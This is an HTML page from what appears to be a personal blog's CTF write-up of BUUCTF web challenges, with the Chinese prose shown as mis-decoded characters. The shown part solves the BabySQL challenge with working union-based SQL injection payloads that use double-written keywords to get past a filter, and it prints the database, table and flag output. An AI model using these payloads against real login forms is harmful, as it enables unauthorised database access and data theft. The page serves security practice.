<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noodp" />
    <title>BUUCTF webè®°å½• 3 - zyleo&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="BUUCTF webè®°å½• 3" />
<meta property="og:description" content="0x00 [æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQLé¢˜ç›®é“¾æ¥ æ‰“å¼€é¢˜ç›®ï¼Œè¿˜æ˜¯ç†Ÿæ‚‰çš„ç”¨æˆ·åå¯†ç æ³¨å…¥ç•Œé¢ ç½‘ç«™é¦–é¡µ é¦–å…ˆåˆ¤æ–­é—­åˆç±»å‹ï¼Œç”¨æˆ·åéšä¾¿å†™ï¼Œå¯†ç æ å¡«ä¸ªb&#39;ï¼Œ" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://liuliuliuzy.github.io/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/" /><meta property="og:image" content="https://liuliuliuzy.github.io/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/featured-image.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-07-19T17:02:23+08:00" />
<meta property="article:modified_time" content="2021-08-24T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://liuliuliuzy.github.io/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/featured-image.png"/>
<meta name="twitter:title" content="BUUCTF webè®°å½• 3"/>
<meta name="twitter:description" content="0x00 [æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQLé¢˜ç›®é“¾æ¥ æ‰“å¼€é¢˜ç›®ï¼Œè¿˜æ˜¯ç†Ÿæ‚‰çš„ç”¨æˆ·åå¯†ç æ³¨å…¥ç•Œé¢ ç½‘ç«™é¦–é¡µ é¦–å…ˆåˆ¤æ–­é—­åˆç±»å‹ï¼Œç”¨æˆ·åéšä¾¿å†™ï¼Œå¯†ç æ å¡«ä¸ªb&#39;ï¼Œ"/>
<meta name="application-name" content="zyleo">
<meta name="apple-mobile-web-app-title" content="zyleo">

<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://liuliuliuzy.github.io/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/" /><link rel="prev" href="https://liuliuliuzy.github.io/2021-06-29-%E5%BF%AB%E4%B9%90%E6%9C%AC%E5%B0%B1%E4%B8%8D%E8%AF%A5%E5%BB%89%E4%BB%B7/" /><link rel="next" href="https://liuliuliuzy.github.io/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "BUUCTF webè®°å½• 3",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/liuliuliuzy.github.io\/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3\/"
        },"image": [{
                            "@type": "ImageObject",
                            "url": "https:\/\/liuliuliuzy.github.io\/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3\/featured-image.png",
                            "width":  2234 ,
                            "height":  312 
                        }],"genre": "posts","keywords": "CTF, web","wordcount":  5747 ,
        "url": "https:\/\/liuliuliuzy.github.io\/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3\/","datePublished": "2021-07-19T17:02:23+08:00","dateModified": "2021-08-24T00:00:00+00:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "zyleo"
            },"description": ""
    }
    </script><script src="//instant.page/5.1.1" defer type="module" integrity="sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq"></script>
</head>

<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark');}
        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('' === 'light' || '' === 'dark' || '' === 'black') setTheme(''), saveTheme(''); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
    </script>
    <div id="back-to-top"></div>
    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="zyleo&#39;s blog">zyleo&#39;s Blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> æ–‡ç«  </a><a class="menu-item" href="/tags/"> æ ‡ç­¾ </a><a class="menu-item" href="/categories/"> åˆ†ç±» </a><a class="menu-item" href="/about/"> å…³äº </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="æœç´¢æ–‡ç« æ ‡é¢˜æˆ–å†…å®¹..." id="search-input-desktop">
                        <a href="#" class="search-button search-toggle" id="search-toggle-desktop" title="æœç´¢">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="#" class="search-button search-clear" id="search-clear-desktop" title="æ¸…ç©º">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="#" class="menu-item theme-select" title="åˆ‡æ¢ä¸»é¢˜">
                    <i class="fas fa-adjust fa-fw"></i>
                    <select class="color-theme-select" id="theme-select-desktop" title="åˆ‡æ¢ä¸»é¢˜">
                        <option value="light">æµ…è‰²</option>
                        <option value="dark">æ·±è‰²</option>
                        <option value="black">é»‘è‰²</option>
                        <option value="auto">è·Ÿéšç³»ç»Ÿ</option>
                    </select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="zyleo&#39;s blog">zyleo&#39;s Blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="æœç´¢æ–‡ç« æ ‡é¢˜æˆ–å†…å®¹..." id="search-input-mobile">
                        <a href="#" class="search-button search-toggle" id="search-toggle-mobile" title="æœç´¢">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="#" class="search-button search-clear" id="search-clear-mobile" title="æ¸…ç©º">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="#" class="search-cancel" id="search-cancel-mobile">
                        å–æ¶ˆ
                    </a>
                </div><a class="menu-item" href="/posts/" title="">æ–‡ç« </a><a class="menu-item" href="/tags/" title="">æ ‡ç­¾</a><a class="menu-item" href="/categories/" title="">åˆ†ç±»</a><a class="menu-item" href="/about/" title="">å…³äº</a><a href="#" class="menu-item theme-select" title="åˆ‡æ¢ä¸»é¢˜">
                <i class="fas fa-adjust fa-fw"></i>
                <select class="color-theme-select" id="theme-select-mobile" title="åˆ‡æ¢ä¸»é¢˜">
                    <option value="light">æµ…è‰²</option>
                    <option value="dark">æ·±è‰²</option>
                    <option value="black">é»‘è‰²</option>
                    <option value="auto">è·Ÿéšç³»ç»Ÿ</option>
                </select>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
            <div class="container"><div class="toc" id="toc-auto">
        <h2 class="toc-title">ç›®å½•</h2>
        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
  <ul>
    <li><a href="#0x00-æå®¢å¤§æŒ‘æˆ˜-2019babysql">0x00 [æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</a>
      <ul>
        <li><a href="#å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥ï¼š</a></li>
      </ul>
    </li>
    <li><a href="#0x01-æå®¢å¤§æŒ‘æˆ˜-2019hardsql">0x01 [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</a>
      <ul>
        <li><a href="#å‚è€ƒé“¾æ¥-1">å‚è€ƒé“¾æ¥ï¼š</a></li>
      </ul>
    </li>
    <li><a href="#0x02-hctf-2018admin">0x02 [HCTF 2018]admin</a>
      <ul>
        <li><a href="#è§£æ³•1å¼±å¯†ç ">è§£æ³•1ï¼šå¼±å¯†ç </a></li>
        <li><a href="#è§£æ³•2unicodeæ¬ºéª—">è§£æ³•2ï¼šunicodeæ¬ºéª—</a></li>
        <li><a href="#è§£æ³•3-ä¿®æ”¹flask-session">è§£æ³•3ï¼š ä¿®æ”¹flask session</a></li>
        <li><a href="#å‚è€ƒé“¾æ¥-2">å‚è€ƒé“¾æ¥ï¼š</a></li>
      </ul>
    </li>
    <li><a href="#0x03-bjdctf2020easy-md5">0x03 [BJDCTF2020]Easy MD5</a>
      <ul>
        <li><a href="#level1">level1</a></li>
        <li><a href="#level2">level2</a></li>
        <li><a href="#level3">level3</a></li>
        <li><a href="#å‚è€ƒé“¾æ¥-3">å‚è€ƒé“¾æ¥ï¼š</a></li>
      </ul>
    </li>
    <li><a href="#0x04-ciscn2019-ååŒ—èµ›åŒº-day2-web1hack-world">0x04 [CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</a></li>
    <li><a href="#0x05-ç½‘é¼æ¯-2020-é’é¾™ç»„areuserialz">0x05 [ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</a>
      <ul>
        <li><a href="#payload1">payload1</a></li>
        <li><a href="#payload2">payload2</a></li>
        <li><a href="#payload3">payload3</a></li>
        <li><a href="#æ€»ç»“">æ€»ç»“</a></li>
        <li><a href="#å‚è€ƒé“¾æ¥-4">å‚è€ƒé“¾æ¥</a></li>
      </ul>
    </li>
    <li><a href="#0x06-suctf-2019checkin">0x06 [SUCTF 2019]CheckIn</a>
      <ul>
        <li><a href="#å‚è€ƒè¿æ¥">å‚è€ƒè¿æ¥ï¼š</a></li>
      </ul>
    </li>
    <li><a href="#0x07-gxyctf2019babysqli">0x07 [GXYCTF2019]BabySQli</a></li>
  </ul>
</nav></div>
    </div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">BUUCTF webè®°å½• 3</h1><div class="post-meta">
            <div class="post-meta-line">
                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="https://github.com/liuliuliuzy" title="Author" target="_blank" rel="noopener noreferrer author" class="author">zyleo</a>
                </span>&nbsp;<span class="post-category">æ”¶å½•äº </span>&nbsp;<span class="post-category">ç±»åˆ« <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-07-19">2021-07-19</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2021-08-24">2021-08-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;çº¦ 5747 å­—&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;é¢„è®¡é˜…è¯» 12 åˆ†é’Ÿ&nbsp;</div>
        </div><div class="featured-image"><img
        
        loading="eager"
        src="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/featured-image.png"
        srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/featured-image.png, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/featured-image.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/featured-image.png 2x"
        sizes="auto"
        alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/featured-image.png"
        title="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/featured-image.png" height="312" width="2234"></div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>ç›®å½•</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#0x00-æå®¢å¤§æŒ‘æˆ˜-2019babysql">0x00 [æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</a>
      <ul>
        <li><a href="#å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥ï¼š</a></li>
      </ul>
    </li>
    <li><a href="#0x01-æå®¢å¤§æŒ‘æˆ˜-2019hardsql">0x01 [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</a>
      <ul>
        <li><a href="#å‚è€ƒé“¾æ¥-1">å‚è€ƒé“¾æ¥ï¼š</a></li>
      </ul>
    </li>
    <li><a href="#0x02-hctf-2018admin">0x02 [HCTF 2018]admin</a>
      <ul>
        <li><a href="#è§£æ³•1å¼±å¯†ç ">è§£æ³•1ï¼šå¼±å¯†ç </a></li>
        <li><a href="#è§£æ³•2unicodeæ¬ºéª—">è§£æ³•2ï¼šunicodeæ¬ºéª—</a></li>
        <li><a href="#è§£æ³•3-ä¿®æ”¹flask-session">è§£æ³•3ï¼š ä¿®æ”¹flask session</a></li>
        <li><a href="#å‚è€ƒé“¾æ¥-2">å‚è€ƒé“¾æ¥ï¼š</a></li>
      </ul>
    </li>
    <li><a href="#0x03-bjdctf2020easy-md5">0x03 [BJDCTF2020]Easy MD5</a>
      <ul>
        <li><a href="#level1">level1</a></li>
        <li><a href="#level2">level2</a></li>
        <li><a href="#level3">level3</a></li>
        <li><a href="#å‚è€ƒé“¾æ¥-3">å‚è€ƒé“¾æ¥ï¼š</a></li>
      </ul>
    </li>
    <li><a href="#0x04-ciscn2019-ååŒ—èµ›åŒº-day2-web1hack-world">0x04 [CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</a></li>
    <li><a href="#0x05-ç½‘é¼æ¯-2020-é’é¾™ç»„areuserialz">0x05 [ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</a>
      <ul>
        <li><a href="#payload1">payload1</a></li>
        <li><a href="#payload2">payload2</a></li>
        <li><a href="#payload3">payload3</a></li>
        <li><a href="#æ€»ç»“">æ€»ç»“</a></li>
        <li><a href="#å‚è€ƒé“¾æ¥-4">å‚è€ƒé“¾æ¥</a></li>
      </ul>
    </li>
    <li><a href="#0x06-suctf-2019checkin">0x06 [SUCTF 2019]CheckIn</a>
      <ul>
        <li><a href="#å‚è€ƒè¿æ¥">å‚è€ƒè¿æ¥ï¼š</a></li>
      </ul>
    </li>
    <li><a href="#0x07-gxyctf2019babysqli">0x07 [GXYCTF2019]BabySQli</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h2 id="0x00-æå®¢å¤§æŒ‘æˆ˜-2019babysql" class="headerLink">
    <a href="#0x00-%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019babysql" class="header-mark"></a>0x00 [æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h2><p><a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]BabySQL" target="_blank" rel="noopener noreferrer">é¢˜ç›®é“¾æ¥</a></p>
<p>æ‰“å¼€é¢˜ç›®ï¼Œè¿˜æ˜¯ç†Ÿæ‚‰çš„ç”¨æˆ·åå¯†ç æ³¨å…¥ç•Œé¢</p>
<p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210721115109030.png" title="image-20210721115109030" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210721115109030.png" data-sub-html="<h2>ç½‘ç«™é¦–é¡µ</h2><p>image-20210721115109030</p>">
        <img
            
            loading="lazy"
            src="image-20210721115109030.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210721115109030.png, image-20210721115109030.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210721115109030.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210721115109030.png">
    </a><figcaption class="image-caption">ç½‘ç«™é¦–é¡µ</figcaption>
    </figure></p>
<p>é¦–å…ˆåˆ¤æ–­é—­åˆç±»å‹ï¼Œç”¨æˆ·åéšä¾¿å†™ï¼Œå¯†ç æ å¡«ä¸ª<code>b'</code>ï¼Œå‘ç°æŠ¥é”™ï¼Œè¯´æ˜æŸ¥è¯¢è¯­å¥æ˜¯å•å¼•å·é—­åˆã€‚</p>
<p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210719170507319.png" title="image-20210719170507319" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210719170507319.png" data-sub-html="<h2>æŠ¥é”™ä¿¡æ¯1</h2><p>image-20210719170507319</p>">
        <img
            
            loading="lazy"
            src="image-20210719170507319.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210719170507319.png, image-20210719170507319.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210719170507319.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210719170507319.png">
    </a><figcaption class="image-caption">æŠ¥é”™ä¿¡æ¯1</figcaption>
    </figure></p>
<p>ç„¶åå°è¯•ä¸€ä¸‹å¯†ç <code>b' or 1=1 #</code>ï¼Œå‘ç°æŠ¥é”™ä¿¡æ¯ä¸­åªæœ‰<code>'1=1 #''</code>ã€‚ä¸€å¼€å§‹æˆ‘ä¹Ÿä¸çŸ¥é“æ˜¯æ€ä¹ˆå›äº‹ï¼ŒæŸ¥é˜…èµ„æ–™ä¹‹åæ‰çŸ¥é“ï¼ŒåŸæ¥æœ‰çš„wafä¼šå¯¹<code>or</code>ã€<code>select</code>ç­‰SQLè¯­å¥å…³é”®å­—åšè¿‡æ»¤ï¼Œæ¯”å¦‚ç›´æ¥æ›¿æ¢ä¸ºç©ºï¼Œæ‰€ä»¥è¿™é¢˜è¦ä½¿ç”¨<a href="https://blog.csdn.net/m0_51504576/article/details/115832188" target="_blank" rel="noopener noreferrer">åŒå†™ç»•è¿‡</a>ã€‚</p>
<p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210719170705563.png" title="image-20210719170705563" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210719170705563.png" data-sub-html="<h2>æŠ¥é”™ä¿¡æ¯2</h2><p>image-20210719170705563</p>">
        <img
            
            loading="lazy"
            src="image-20210719170705563.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210719170705563.png, image-20210719170705563.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210719170705563.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210719170705563.png">
    </a><figcaption class="image-caption">æŠ¥é”™ä¿¡æ¯2</figcaption>
    </figure></p>
<p>è¯•ç€ä½¿ç”¨unionæŸ¥è¯¢ï¼Œè¾“å…¥<code>b' ununionion seselectlect 1,2,3 #</code>ï¼Œæ˜¾ç¤ºæˆåŠŸç™»å½•ä¿¡æ¯ï¼Œè¯´æ˜è¢«æŸ¥è¯¢çš„è¡¨çš„åˆ—æ•°ä¸º3ã€‚</p>
<p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210721115510406.png" title="image-20210721115510406" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210721115510406.png" data-sub-html="<h2>å›æ˜¾ä¿¡æ¯</h2><p>image-20210721115510406</p>">
        <img
            
            loading="lazy"
            src="image-20210721115510406.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210721115510406.png, image-20210721115510406.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210721115510406.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210721115510406.png">
    </a><figcaption class="image-caption">å›æ˜¾ä¿¡æ¯</figcaption>
    </figure></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯å¥—è·¯åŒ–çš„æ“ä½œï¼Œç²¾é«“æ˜¯ä½¿ç”¨<code>information_schema</code>ç­‰è®°å½•æ•°æ®åº“è‡ªèº«ä¿¡æ¯çš„æ•°æ®åº“ï¼Œä»¥åŠ<code>group_concat()</code>å‡½æ•°ã€‚å› ä¸ºçœ‹åˆ°äº†2å’Œ3çš„å›æ˜¾ï¼Œæ‰€ä»¥æŠŠ2å’Œ3æ›¿æ¢ä¸ºå…¶å®ƒè¡¨è¾¾å¼å¯ä»¥è¿›è¡Œæ³¨å…¥ã€‚</p>
<p>æ‡’å¾—æ”¾æˆªå›¾ï¼Œç›´æ¥æŠŠå›æ˜¾ç»“æœè´´ä¸€ä¸‹ã€‚</p>
<p>é¦–å…ˆæŸ¥çœ‹å½“å‰æ•°æ®åº“</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">b</span><span class="s1">&#39; ununionion seselectlect 1,2,database() #
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Hello 2ï¼
</span></span><span class="line"><span class="cl">Your password is &#39;geek&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">b</span><span class="s1">&#39; ununionion seselectlect 1,2,group_concat(schema_name)frfromom (infoorrmation_schema.schemata) #
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Hello 2ï¼
</span></span><span class="line"><span class="cl">Your password is &#39;information_schema,mysql,performance_schema,test,ctf,geek&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>çœ‹åˆ°ä¸€ä¸ª<code>ctf</code>åº“ï¼Œå†å»çˆ†è¿™ä¸ªæ•°æ®åº“çš„è¡¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">b</span><span class="s1">&#39; ununionion seselectlect 1,2,group_concat(table_name)frfromom(infoorrmation_schema.tables) whwhereere table_schema=&#34;ctf&#34; #
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Hello 2ï¼
</span></span><span class="line"><span class="cl">Your password is &#39;Flag&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…¶ä¸­æœ‰ä¸ª<code>Flag</code>è¡¨ï¼Œç„¶åå†å»çˆ†å­—æ®µ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">b</span><span class="s1">&#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom (infoorrmation_schema.columns) whwhereere table_name=&#34;Flag&#34;
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Hello 2ï¼
</span></span><span class="line"><span class="cl">Your password is &#39;flag&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…¶ä¸­æœ‰<code>flag</code>å­—æ®µï¼Œå†å»çˆ†æ•°æ®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">b</span><span class="s1">&#39; ununionion seselectlect 1,2,group_concat(flag)frfromom(ctf.Flag)
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æ‹¿åˆ°flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Hello 2ï¼
</span></span><span class="line"><span class="cl">Your password is &#39;flag{b11bfeba-d864-4a0a-97f6-77e3ef266da9}&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸ªäººæ„Ÿè§‰ï¼Œè¿™é¢˜çš„è¦ç‚¹åœ¨äºæ•°æ®åº“æœ¬èº«ä¿¡æ¯æ•°æ®åº“çš„å†…å®¹ï¼Œä»¥åŠ<code>group_concat</code>çš„ä½¿ç”¨ï¼ŒåŒå†™ç»•è¿‡å…¶å®æ˜¯ä¸ªå¾ˆç®€å•çš„ä¸œè¥¿ã€‚</p>
<h3 id="å‚è€ƒé“¾æ¥" class="headerLink">
    <a href="#%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5" class="header-mark"></a>å‚è€ƒé“¾æ¥ï¼š</h3><ul>
<li>
<p><a href="https://www.cnblogs.com/kankanhua/p/6484972.html" target="_blank" rel="noopener noreferrer">information_schemaæ•°æ®åº“</a></p>
</li>
<li>
<p><a href="https://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php" target="_blank" rel="noopener noreferrer">group_concat()å‡½æ•°</a></p>
</li>
</ul>
<h2 id="0x01-æå®¢å¤§æŒ‘æˆ˜-2019hardsql" class="headerLink">
    <a href="#0x01-%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019hardsql" class="header-mark"></a>0x01 [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><p><a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]HardSQL" target="_blank" rel="noopener noreferrer">é¢˜ç›®é“¾æ¥</a></p>
